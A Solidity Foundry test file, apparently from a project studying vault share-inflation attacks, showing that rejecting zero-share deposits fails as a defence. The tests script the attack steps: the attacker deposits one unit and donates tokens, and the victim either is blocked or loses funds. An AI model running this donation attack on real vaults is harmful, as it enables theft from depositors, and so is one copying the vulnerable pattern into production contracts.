// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AttackBase, IVault} from "../helpers/AttackBase.sol";
import {NaiveVault} from "../../src/vaults/NaiveVault.sol";

/// The non-defence: require(shares != 0) in deposit.
contract RevertOnZeroSharesTest is AttackBase {
    /// Small deposits revert: the attacker has turned theft into denial of service.
    function test_smallDeposit_isDoS() public {
        NaiveVault vault = new NaiveVault(token, true);
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), DONATION);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vm.expectRevert(bytes("ZERO_SHARES"));
        vault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();
    }

    /// Large deposits pass the check and still lose 2,500.
    function test_largeDeposit_stillLoses() public {
        NaiveVault vault = new NaiveVault(token, true);
        Result memory r = _attack(IVault(address(vault)), 15_000e18);
        _log("revert-on-zero, victim 15,000", r);
        assertEq(r.victimShares, 1);
        assertLt(r.victimPnl, 0);
        assertGt(r.attackerProfit, 0);
    }
}
